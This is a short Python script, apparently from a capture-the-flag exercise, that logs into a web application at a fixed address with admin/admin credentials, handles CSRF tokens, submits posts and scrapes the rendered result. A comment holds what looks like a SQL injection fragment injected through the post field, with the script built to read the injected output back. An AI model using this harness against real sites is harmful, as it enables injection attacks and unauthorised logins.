import requests
from bs4 import BeautifulSoup
#'+hex('a'),"1","2019-09-30")#
def get_csrf_token(text,csrf_name="csrf_token"):
    bs=BeautifulSoup(text, 'html.parser')
    return bs.find("input",attrs={"name":csrf_name})['value']
session=requests.session()
def login(session):
    login_url="http://111.198.29.45:48771/login"
    res=session.get(login_url)
    token=get_csrf_token(res.text)
    #csrf_token=a&username=sdfas&password=asdfasd&submit=Sign+In
    data={
        "csrf_token":token,
        "username":"admin",
        "password":"admin",
        "submit":"Sign+In"
    }
    result=session.post(login_url,data=data).text
def post(session,post_data):
    #csrf_token=ImRmOTMwZDZiNTZjYTMwYTM1MDZhNjYwN2RhN2ExYzBlOTRmMjY5MzMi.XZIYpg.7txloilGax4es41Cq3B-3V4l-TM&post=asdfasdf&submit=Submit
    post_url="http://111.198.29.45:48771/index"
    res=session.get(post_url)
    token=get_csrf_token(res.text)
    data={
        "csrf_token":token,
        "post":post_data,
        "submit":"Submit"
    }
    result=session.post(post_url,data=data).text
    bs=BeautifulSoup(result, 'html.parser')
    if "Your post is now live!" in result:
        r=bs.find_all("table",class_="table table-hover")[0].find_all("td")[-1].text
        r=r[r.index("said 2019-09-30T00:00:00Z:")+len("said 2019-09-30T00:00:00Z:")+14:].replace("\n","")
        return r
    else :
        raise RuntimeError("post失败")
